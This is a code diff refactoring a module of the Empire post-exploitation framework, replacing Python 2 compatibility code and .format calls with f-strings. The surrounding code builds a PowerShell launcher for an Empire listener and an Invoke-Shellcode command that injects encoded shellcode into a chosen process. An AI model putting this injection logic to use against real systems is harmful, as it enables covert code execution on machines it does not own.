@@ -1,6 +1,3 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -8,7 +5,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -37,9 +34,7 @@ class Module(object):
 
         if not main_menu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message(
-                "[!] Invalid listener: {}".format(listener_name)
-            )
+            return handle_error_message(f"[!] Invalid listener: {listener_name}")
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
@@ -63,7 +58,7 @@ class Module(object):
         script_end = '\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String("{}")) -Force'.format(
             proc_id, encoded_sc
         )
-        script_end += "; shellcode injected into pid {}".format(str(proc_id))
+        script_end += f"; shellcode injected into pid {str(proc_id)}"
 
         script = main_menu.modulesv2.finalize_module(
             script=script,
